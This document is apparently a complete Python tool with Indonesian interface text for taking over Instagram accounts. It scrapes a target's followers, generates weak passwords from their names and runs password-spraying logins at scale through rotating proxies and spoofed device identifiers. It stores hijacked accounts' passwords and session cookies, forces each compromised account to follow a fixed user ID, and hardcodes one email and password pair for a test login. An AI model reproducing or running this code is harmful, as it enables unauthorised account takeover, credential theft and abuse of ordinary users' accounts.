import os, requests, random, time, re, base64, json, hashlib, datetime, string, io, struct, httpx
from concurrent.futures import ThreadPoolExecutor
from rich.progress import Progress, TextColumn
from datetime import datetime
from uuid import uuid4

from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from nacl.public import PublicKey, SealedBox

from useragent.useragent import Generateuseragent

LOGIN, DUMP, OK, CP, LOOPING, waktu = {},[],[],[],0, datetime.now().strftime("%d-%m-%Y")

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
M = "\x1b[0;31m" # Merah


class Asset:
	def __init__(Jar):
		Jar.proxies = {'Update': None, 'proxy': []}
		Jar.z = ['http', 'socks4', 'socks5']
		Jar.x = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$')
		
	def random_proxy(Jar):
		for protocol in Jar.z:
			try:
				with requests.Session() as r:
					headers = {
						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
					}
					response = r.get(f'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol={protocol}&proxy_format=protocolipport&format=text', headers=headers)
					if response.status_code == 200:
						
						yahaha = [
							f"{protocol}://{proxy}"
							for proxy in response.text.splitlines()
							if Jar.x.match(proxy)
						]
						
						Jar.proxies['proxy'].extend(
							proxy for proxy in yahaha if Jar.proxies not in Jar.proxies['proxy']
						)
						
					else:
						Jar.load_proxy()
			except Exception as e:Jar.load_proxy()
			except requests.RequestException:Jar.load_proxy()
	
	def load_proxy(Jar):
		try:
			with open('Data/proxies.txt', 'r') as file:
				proxy = file.read().splitlines()
				if proxy:
					Jar.proxies['proxy'].append(random.choice(proxy))
		except FileNotFoundError:
			print(" > File 'Data/proxies.txt' tidak ditemukan.")
				
	def get_random_proxy(Jar):
		if not Jar.proxies['proxy']:Jar.random_proxy()
		return random.choice(Jar.proxies['proxy']) if Jar.proxies['proxy'] else None
				
	def mobile_config(Jar, mid, useragent):
		try:
			with requests.Session() as r:
				r.headers.update({
					'host': 'b.i.instagram.com',
					'user-agent': useragent,
					'x-ig-device-id': str(uuid4()),
					'x-ig-family-device-id': str(uuid4()),
					'x-ig-android-id': f'android-{uuid4().hex[:16]}',
					'x-ig-device-locale': 'in_ID',
					'x-fb-connection-type': 'MOBILE.LTE',
					'x-ig-connection-type': 'MOBILE(LTE)',
					'x-ig-capabilities': '3brTv10=',
					'x-bloks-version-id': 'dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb',
					'x-ig-app-locale': 'in_ID',
					'x-ig-app-id': '567067343352427',
					'x-mid': mid,
					'x-ig-mapped-locale': 'id_ID',
					'x-fb-http-engine': 'Tigon/Liger',
				})
				
				data = {
					"bool_opt_policy":"0",
					"mobileconfigsessionless":"",
					"api_version": "9",
					"unit_type":"1",
					"use_case": "STANDARD",
					"query_hash": "0c7118bd2297225abd8a43254eb0e307329184e92f88b503af751c079d2e861c",
					"ts": str(datetime.now().timestamp())[:10],
					"device_id":r.headers["x-ig-device-id"],
					"fetch_mode": "CONFIG_SYNC_ONLY",
					"fetch_type":"ASYNC_FULL",
					"family_device_id":r.headers["x-ig-family-device-id"].upper()
				}
				response = r.post('https://b.i.instagram.com/api/v1/launcher/mobileconfig/', data = data)
				key_id = response.headers.get('ig-set-password-encryption-key-id')
				pub_key = response.headers.get('ig-set-password-encryption-pub-key')
				if not key_id or not pub_key:
					return {'key_id': None, 'public_key': None}
					
				return {'key_id': key_id,'public_key': pub_key}
		except (requests.exceptions.ConnectionError):
			return {'key_id': None, 'public_key': None}
	
	def encrypt_password(Jar, password, pub_key, key_id):
		try:
			rand_key = get_random_bytes(32)
			iv = get_random_bytes(12)
			pubkey_bytes = base64.b64decode(pub_key)
			pubkey = RSA.import_key(pubkey_bytes)
			cipher_rsa = PKCS1_v1_5.new(pubkey)
			encrypted_rand_key = cipher_rsa.encrypt(rand_key)
			cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
			current_time = int(time.time())
			cipher_aes.update(str(current_time).encode("utf-8"))
			encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
			buf = io.BytesIO()
			buf.write(bytes([1, int(key_id)]))
			buf.write(iv)
			buf.write(struct.pack("<h", len(encrypted_rand_key)))
			buf.write(encrypted_rand_key)
			buf.write(auth_tag)
			buf.write(encrypted_passwd)
			encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
			return f"#PWD_INSTAGRAM:4:{current_time}:{encoded}"
		except Exception as e:
			return '#PWD_INSTAGRAM:0:{}:{}'.format(str(int(time.time())), password)
		
	def info_no_login(Jar, username):
		try:
			with requests.Session() as r:
				headers = {'sec-fetch-dest': "document",'sec-fetch-site': "none",'sec-fetch-mode': "navigate",'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",'x-ig-app-id': "1217981644879628",}
				response = r.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=headers).json()
				return {
					'followers': response.get('data').get('user').get('edge_followed_by', '').get('count'),
					'following': response.get('data').get('user').get('edge_follow', '').get('count')
				}
		except:
			return {'followers': None,'following': None}
			
	def follow_dong(Jar, useragent, cookie):
		try:
			with requests.Session() as r:
				userid = re.search("ds_user_id=(\\d+)", cookie).group(1)
				r.headers.update({
					'host': 'i.instagram.com',
					'accept-language': 'id-ID, en-US',
					'x-ig-connection-type': "MOBILE(LTE)",
					'ig-u-ds-user-id': userid,
					'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'x-bloks-version-id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
					'user-agent': useragent,
				})
				dev = 'android-{}'.format(str(uuid4().hex))[:16]
				data = {
					'signed_body': f'SIGNATURE.{{"include_follow_friction_check":"1","user_id":"72846933362","radio_type":"mobile-lte","_uid":"{userid}","device_id":"{dev}","_uuid":"{str(uuid4())}","nav_chain":"ExploreFragment:explore_popular:2:main_search:{time.time():.3f}:::{time.time():.3f},ForYouSerpGridFragment:serp_top:4:button:{time.time():.3f}:::{time.time():.3f},UserDetailFragment:profile:5:search_result:{time.time():.3f}:::{time.time():.3f},ProfileMediaTabFragment:profile:6:button:{time.time():.3f}:::{time.time():.3f}","container_module":"profile"}}'
				}
				response = r.post("https://i.instagram.com/api/v1/friendships/create/72846933362/", data=data, cookies={'cookie': cookie}).json()
				if not ('following' in response['friendship_status'] and response['friendship_status']['following']):
					pass
		except Exception as e:
			pass
			
	def checkprofile(Jar,  useragent, cookie):
		try:
			with requests.Session() as r:
				user_id= re.search(r'ds_user_id=(\d+);', cookie)
				userid =  user_id.group(1) if user_id else None
				
				r.headers.update({
					'host': 'i.instagram.com',
					'accept-language': 'id-ID, en-US',
					'x-ig-connection-type': "MOBILE(LTE)",
					'ig-u-ds-user-id': userid,
					'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'x-bloks-version-id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
					'user-agent': useragent,
                })
                
				response = r.get(f'https://i.instagram.com/api/v1/users/{userid}/info/', cookies = {'cookie': cookie}).text
				print(response)
				if 'user' not in response:
					return {'followers': f'{M}None{N}','following': f'{M}None{N}','facebook': f'{M}None{N}'}
					
				followers = re.search('"follower_count":(\d+)', response).group(1)
				following = re.search('"following_count":(\d+)', response).group(1)
				facebook_match = re.search(r'"linked_fb_info"\s*:\s*{\s*"linked_fb_user"\s*:\s*{.*?"name"\s*:\s*"([^"]+)"', response)
				facebook =  f'{H}{facebook_match.group(1)}{N}' if facebook_match else f'{M}None{N}'

				return {
					'followers': f'{H}{followers}{N}',
					'following': f'{H}{following}{N}',
					'facebook': facebook,
				}
		except Exception as e:
			return {'followers': f'{M}None{N}','following': f'{M}None{N}','facebook': f'{M}None{N}'}
			
	def login(Jar):
		try:
			cookie = input(" > Masukkan Cookies Instagram Anda (gunakan akun tumbal): ")
			cookies = Jar.validasi_cookie(cookie)
			if not cookies:
				print(f' > Login Cookies Gagal Cobalagi..!!!')
				exit()
					
			if 'sessionid' in str(cookie):
				cookie_data = {'Cookie': cookie}
				
				if not os.path.exists('Data'):
					os.makedirs('Data')
				
				cookie_data = {'Cookie': cookie}
				with open('Data/Cookies.json', 'w') as file:
					json.dump(cookie_data, file)
					
				Start().Menu()
			else:
				print(f' > Login Cookies Gagal Cobalagi..!!!')
				time.sleep(1.5)
				Jar.login()
					
		except (Exception, AttributeError, ValueError) as e:
			print(f' > Login Error: {e}')
			time.sleep(1.5)
			Jar.login()
			
	def validasi_cookie(Jar, cookie):
		if 'mid=' in str(cookie): mid = re.search('mid=(.*?);', cookie).group(1)
		else:mid = ''
		try:
			with requests.Session() as r:
				user_id= re.search(r'ds_user_id=(\d+);', cookie)
				userid =  user_id.group(1) if user_id else None
				r.headers.update({
					'host': 'i.instagram.com',
					'accept-language': 'id-ID, en-US',
					'x-ig-connection-type': "MOBILE(LTE)",
					'x-fb-friendly-name': f"IgApi: users/{userid}/info_stream/",
					'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'x-bloks-version-id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
					'user-agent': 'Instagram 361.0.0.46.88 Android (34/14; 253dpi; 720x1477; ITEL/Itel; itel S666LN; itel-S666LN; mt6789; in_ID; 674674275)',
					'x-mid': mid,
				})
				response = r.get(f'https://i.instagram.com/api/v1/users/{userid}/info/', cookies = {'cookie': cookie}).json().get('user')
				return {
					'follower': response.get('follower_count'),
					'nama': response.get('full_name')
				}		
		except Exception as e:
			if os.path.exists('Data/Cookies.json'):
				os.remove('Data/Cookies.json')
			return {'nama': None,'follower': None}
			
class Start:
	
	def load_cookie(Jar):
		if os.path.exists('Data/Cookies.json'):
			with open('Data/Cookies.json', 'r') as file:
				return json.load(file).get('Cookie', '')
		return None
        
	def Menu(Jar):
		os.system('cls' if os.name == 'nt' else 'clear')
		
		cookie = Jar.load_cookie()
		if not cookie:
			print(" > Cookies tidak ditemukan, silakan login.")
			Asset().login()
			return 
		
		profil = Asset().validasi_cookie(cookie)
		if profil is False or profil['nama'] is None:
			print(" > Cookies tidak valid, silakan login kembali.")
			Asset().login()
			return
			
		print(f""" > Profil: {H}{profil['nama']}{N}|{H}{profil['follower']}{N}
		
 1. Dump username (Instagram)
 2. Dump username (Threads)
 3. Crack dari file
 4. Check result
 5. {M}Logout{N}
		""")
		
		query = input(' > pilih: ')
		if query == '1' or query == '01':
			InstagramDump().DumpUsername(cookie)
			Main().Run()
		
		elif query == '2' or query == '02':
			TheadsDump().GetData(cookie)
			Main().Run()
			
		elif query == '3' or query == '03':
			print()
			file_list = os.listdir('Dump')
			if not file_list:
				print(" > Tidak ada file Dump")
				exit()
			
			print("\t[ Daftar file Dump ]\n")
			for i, file in enumerate(file_list, 1):
				with open(f'Dump/{file}', 'r') as f:
					total_ids = len(f.readlines())
				print(f" {i}. {file} ({total_ids} ID)")
				
			print("\n > Pilih file (nomor, Gunakan koma untuk pilih beberapa file)\n > tekan Enter untuk dump semua")
			query = input(" > Pilih: ").strip()
			if not query:
				print("\n > Mengumpulkan ID dari semua file...")
				selected_files = file_list
				
			else:
				indices = [num.strip() for num in query.split(",") if num.strip().isdigit()]
				if all(1 <= int(num) <= len(file_list) for num in indices):
					selected_files = [file_list[int(num) - 1] for num in indices]
					print(f"\n > Mengumpulkan ID dari file: {', '.join(selected_files)}")
					
				else:
					print(" > Pilihan tidak valid.")
					exit()
					
			for file in selected_files:
				with open(f'Dump/{file}', 'r') as f:
					for item in f.read().splitlines():
						DUMP.append(item)
						print(f" > Mengumpulkan {H}{len(DUMP)}{N} ", end='\r')
						
			if len(DUMP) < 50:
				print(" > Dump terlalu sedikit")
				exit()
			
			print(f'{" "*50}', end='\r')
			time.sleep(1.0)
			print(f' > Jumlah username terkumpul: {len(DUMP)}')
			time.sleep(1)
			Main().Run()
			
		elif query == '3' or query == '03':pass
		elif query == '5' or query == '05':
			os.remove('Data/Cookies.json')

class InstagramDump:
	
	def Account_Info(Jar, cookie, username):
		try:
			with requests.Session() as r:
				r.headers.update({
					'User-Agent': 'Instagram 309.1.0.41.113 Android (28/9; 411dpi; 1080x2139; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; in_ID; 541635890)',
				})
				response = r.get(f'https://i.instagram.com/api/v1/users/{username}/usernameinfo/', cookies = {'cookie': cookie}).json().get('user')
				return {
					'id': response.get('pk_id', ''),
					'followers': response.get('follower_count', ''),
					'following': response.get('following_count', '')
				}
		except:
			return {'id': None,'followers': None,'following': None}
	
	def DumpUsername(Jar, cookie):
		global progress, prog
		cursor, end_cursor = True, ''
		
		print('\n > Masukan username Target')
		username_ = input(" > username: ")
		username_info = Jar.Account_Info(cookie, username_)
		if not username_info:
			print(' > Gagal mendapatkan informasi pengguna.')
			return
			
		print(f"""
 1. pengikut: {username_info.get("followers")}
 2. mengikuti: {username_info.get("following")}
		""")
			
		usr_in = input(' > pilih :')
		type = 'followers' if usr_in == '1' else 'following'
		edge = 'edge_followed_by' if usr_in == '1' else 'edge_follow'
		query_hash ="c76146de99bb02f6415203be841dd25a" if usr_in =="1" else "d04b0a864b4b54837c0d870b0e77e076"
		count = username_info.get("followers") if usr_in =="1" else username_info.get("following")
		with Progress(TextColumn('{task.description}')) as progress:
			prog = progress.add_task(f" > Mengumpulkan {type}...", total=int(count))
			while cursor:
				try:
					with requests.Session() as r:
						params = {"query_hash": query_hash,"id": username_info.get('id'),"first": 100,"after": end_cursor}
						r.headers.update({
							"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
							"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
							"cookie": cookie
						})
						response = r.get("https://www.instagram.com/graphql/query/", params=params, cookies={'cookie': cookie}).json()
						cursor = response['data']['user'][edge]['page_info']['has_next_page']		
						for Asset in response['data']['user'][edge]['edges']:
							try:
								username = Asset["node"]["username"]
								full_name = Asset["node"]["full_name"]
								DUMP.append(f"{username}|{full_name}")
								progress.update(prog, description=f" > mengumpulkan {H}{len(DUMP)}{N}  username: {M}{username[:6]}{N}", advance=1)
							except (requests.exceptions.JSONDecodeError,json.decoder.JSONDecodeError):continue
						if (cursor):
							end_cursor = response["data"]["user"][edge]["page_info"]["end_cursor"]
				except (KeyboardInterrupt):
					break
			
		simpan = input(' > apakah anda ingin menyimpan dump ini? (y/t): ').lower()
		if simpan != 't':
			file = f'Dump/{username_}-{waktu}.json'
			with open(file, "a") as f:
				for line in DUMP:
					f.write(line + "\n")
			print(f" > Tersimpan: {H}{file}{N}")
			exit()

class Main:
	def __init__(Jar):
		pass
	
	def myuseragent(Jar):
		app = Generateuseragent()
		return app.instagram()
	
	def useragent(Jar):
		ua = random.choice([
			'Instagram 368.0.0.45.96 Android (34/14; 274dpi; 720x1471; ITEL/Itel; itel S666LN; itel-S666LN; mt6789; in_ID; 700073482)',
			"Instagram 368.0.0.45.96 Android (29/10; 480dpi; 1080x1920; Xiaomi; Redmi Note 7; lavender; qcom; in_ID; 700073482)",
			"Instagram 368.0.0.45.96 Android (30/11; 420dpi; 1080x2260; Samsung; Galaxy A51; a51; samsungexynos9611; in_ID; 700073482)",
			"Instagram 368.0.0.45.96 Android (28/9; 320dpi; 720x1280; Huawei; Y6 2019; hwMRD-MX; mt6761; in_ID; 700073482)",
			"Instagram 368.0.0.45.96 Android (29/10; 480dpi; 1080x1920; OnePlus; OnePlus 7T; oneplus7t; qcom; in_ID; 700073482)",
			"Instagram 368.0.0.45.96 (iPhone10,5; iOS 11_2_6; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)",
			"Instagram 368.0.0.45.96 (iPhone9,3; iOS 11_2_2; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)",
			"Instagram 368.0.0.45.96 Android (22/5.1; 240dpi; 480x854; Vodafone; VF-696; smart_grand; mt6580; pt_PT; 700073482)"
		])
		return ua
		
	def Run(Jar):
		print("""
 > Pilih library http yang akan digunakan:
 1. httpx
 2. requests
		""")
		query = input(' > pilih: ')
		if query == '1' or query == '01':
			LOGIN.update({'Library': 'httpx'})
		else:
			LOGIN.update({'Library': 'requests'})
		print('\n > proses crack instagram\n > mainkan mode pesawat setiap 100 id\n')
		with ThreadPoolExecutor(max_workers=35) as Z:
			for data in DUMP:
				try:
					nama, name = data.split('|')
				except:pass
				password = Jar.generate_password(name)
				Z.submit(Jar.startcrack, nama, password)
	
	def generate_password(Jar, name):
		password = []
		for nama in name.split(' '):
			if len(name) <= 5:
				if len(nama) < 3:
					continue
				else:
					password.append(nama.lower() + '123')
					password.append(nama.lower() + '1234')
					password.append(nama.lower() + '12345')
			else:
				if len(nama) < 3:
					continue
				else:
					password.append(nama.lower() + '123')
					password.append(nama.lower() + '1234')
					password.append(nama.lower() + '12345')
			if len(nama) <5:pass
			else:
				password.append(name.replace(' ','').lower())
				password.append(name.lower())
		password_ = []
		for x in password:
			if str(x) in str(password_):
				continue
			else:
				password_.append(x)
		return(password_)
	
	def remove_ansi(Jar, text):
		ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
		return ansi_escape.sub('', text)
		
	def SaveRessult(Jar, data, success):
		try:
			file_type = "OK" if success else "CP"
			file_path = f"Results/{'Login' if success else 'Checkpoint'}/{file_type}-{waktu}.json"
			clean_data = {key: Jar.remove_ansi(str(value)) for key, value in data.items()}
			with open(file_path, 'a') as f:
				f.write(json.dumps(clean_data) + '\n')
		except Exception as e:
			pass
			
	def Printing(Jar, data, success):
		status = "Success Login" if success else "Checkpoint Login"
		color = H if success else K
		
		print(f"""\r{' ' * 76}
 > {color}{status}{N}
    > username     : {color}{data.get("username")}{N}
    > password     : {color}{data.get("password")}{N}
    > account      : {data.get("account")}{N}
    > facebook     : {data.get("facebook")}{N}
    > cookie       : {color}{data.get('cookie', '-')}{N}
		""")
		
	def generate_key_hash(Jar):
		random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))
		key_hash = hashlib.sha256(random_string.encode()).hexdigest()
		return key_hash
		
	def attestation(Jar):
		try:
			headers = {
				'host': 'i.instagram.com',
				'user-agent': Jar.useragent(),
				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'x-bloks-prism-indigo-link-version': '0',
				'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
				'x-fb-friendly-name': "IgApi: attestation/create_android_keystore/",
				'x-ig-app-id': '567067343352427',
				'x-ig-device-id': str(uuid4()),
				'x-ig-android-id': f'android-{uuid4().hex[:16]}',
				'x-ig-timezone-offset': str(-time.timezone),
				'x-bloks-version-id': 'dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb',
				'x-ig-connection-type': 'MOBILE(LTE)',
				'x-fb-http-engine': 'Liger',
				'x-fb-server-cluster': 'True',
				'accept-language': 'id-ID, en-US',
			}
			data = {
				"app_scoped_device_id": str(uuid4()),
				"key_hash": Jar.generate_key_hash()
			}
			response= requests.post('https://i.instagram.com/api/v1/attestation/create_android_keystore/', data=data, headers=headers)		
			mid = response.headers.get('ig-set-x-mid') or re.findall('mid=(.*?);', str(response.headers))[0]
			challenge_nonce = response.json().get('challenge_nonce')
			return {'mid': mid, 'nonce': challenge_nonce}
		except (requests.exceptions.ConnectionError):
			return {'mid': None, 'nonce': None}
			
				
	def android_id(Jar, users, passwd):
		xyz = hashlib.md5()
		xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
		hex = xyz.hexdigest()
		xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
		return xyz.hexdigest()
		
	def startcrack(Jar, username, password):
		global LOOPING, OK, CP
		att = Jar.attestation()['mid']
		useragent = Jar.useragent()
		config = Asset().mobile_config(att, useragent)
		request = LOGIN['Library']
		if request == 'requests': r = requests.Session()
		else:r = httpx
		for pw in password:
			try:
				print(config['public_key'])
				encpas = Asset().encrypt_password(pw, config['public_key'], config['key_id'])
				headers = {
					'host': 'i.instagram.com',
					'x-ig-device-locale': 'in_ID',
					'x-ig-nav-chain': f'com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:{time.time():.2f}::',
					'x-pigeon-session-id': f'UFS-{uuid4()}-0',
					'x-ig-device-id': str(uuid4()),
					'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'x-ig-mapped-locale': 'id_ID',
					'x-mid': att,
					'x-pigeon-rawclienttime': f'{time.time():.3f}',
					'x-ig-timezone-offset': str(-time.timezone),
					'x-ig-android-id': 'android-{}'.format(Jar.android_id(username, pw)[:16]),
					'x-ig-family-device-id': str(uuid4()),
					'x-ig-app-id': '567067343352427',
					'x-fb-connection-type': 'MOBILE.LTE',
					'x-bloks-version-id': 'dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb',
					'x-ig-capabilities': '3brTv10=',
					'accept-language': 'id-ID, en-US',
					'user-agent': useragent
				}
				data = {
					'params': json.dumps({
						"client_input_params": {
							"device_id": headers['x-ig-android-id'],
							"lois_settings": {
								"lois_token": ""
							},
							"name": username,
							"machine_id": headers['x-mid'],
							"profile_pic_url": None,
							"contact_point": username,
							"encrypted_password": encpas,
						},
						"server_params": {
							"is_from_logged_out": 0,
							"layered_homepage_experiment_group": None,
							"device_id": headers['x-ig-android-id'],
							"waterfall_id": str(uuid4()),
							"INTERNAL__latency_qpl_instance_id": 27101907200595,
							"login_source": "Login",
							"is_platform_login": 0,
							"INTERNAL__latency_qpl_marker_id": 36707139,
							"family_device_id": headers['x-ig-family-device-id'],
							"offline_experiment_group": "caa_iteration_v3_perf_ig_4",
							"access_flow_version": "pre_mt_behavior",
							"is_from_logged_in_switcher": 1,
							"qe_device_id": headers['x-ig-device-id']
						}
					}),
					'bk_client_context': json.dumps({"bloks_version":headers["x-bloks-version-id"],"styles_id":"instagram"}),
					'bloks_versioning_id': headers['x-bloks-version-id']
				}
				response = r.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=data, headers=headers)
				response_text = response.text.replace('\\','')
				if '"IG-Set-Authorization"' in response_text and "full_name" in response_text:
					bearer = re.search(r'"{"IG-Set-Authorization": "(.*?)"', response_text)
					if bearer:
						authorization = bearer.group(1)
						decode = json.loads(base64.b64decode(authorization.split('Bearer IGT:2:')[1]).decode())
						coki = ';'.join(['%s=%s'%(x,y) for x,y in decode.items()])
						
					Asset().follow_dong(useragent, coki)
					profile_data = Asset().checkprofile(useragent, coki)
					if not profile_data:
						profile_data = Asset().Account_Info(username)
							
					userdata = {
						'username': username,
						'password': pw,
						'account': f"{profile_data.get('followers')}|{profile_data.get('following')}",
						'facebook': profile_data.get('facebook'),
						'cookie': coki
					}
					Jar.Printing(userdata, True)
					Jar.SaveRessult(userdata, True)
					OK.append(f'{username}|{pw}|{coki}')		
					break		
				elif "challenge_required" in response_text:
					challenge_info = Asset().info_no_login(username)
						
					userdata = {
						'username': username,
						'password': pw,
						'account': f"{challenge_info.get('followers')}{N}|{K}{challenge_info.get('following')}"
					}					
					Jar.Printing(userdata, False)
					Jar.SaveRessult(userdata, False)
					CP.append(f'{username}{pw}')		
					break
				elif 'com.bloks.www.ap.two_step_verification.entrypoint_async'  in response_text:
					challenge_info = Asset().info_no_login(username)			
					userdata = {
						'username': username,
						'password': pw,
						'account': f"{challenge_info.get('followers')}{N}|{K}{challenge_info.get('following')}"
					}
					Jar.Printing(userdata, False)
					Jar.SaveRessult(userdata, False)
					CP.append(f'{username}{pw}')		
					break		
				elif "ip_block" in response_text or "Please wait" in response_text or "generic_request_error" in response_text:
					print(f' {R}SPAM{N} Progress {LOOPING}|{len(DUMP)} > Log-in: {H}{len(OK)}{N} > Failed: {K}{len(CP)}{N} ', end = '\r')
					time.sleep(30)
						
				else:continue
			except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):
				time.sleep(30)
				Jar.startcrack(username, [pw])
		LOOPING += 1
		print(f' Progress {LOOPING}|{len(DUMP)} > Log-in: {H}{len(OK)}{N} > Failed: {K}{len(CP)}{N}{" "*15}', end = '\r')

LOGIN.update({'Library': 'requests'})
Main().startcrack('saepulfajar440@gmail.com', ['FAJAR123#'])
exit()
Start().Menu()

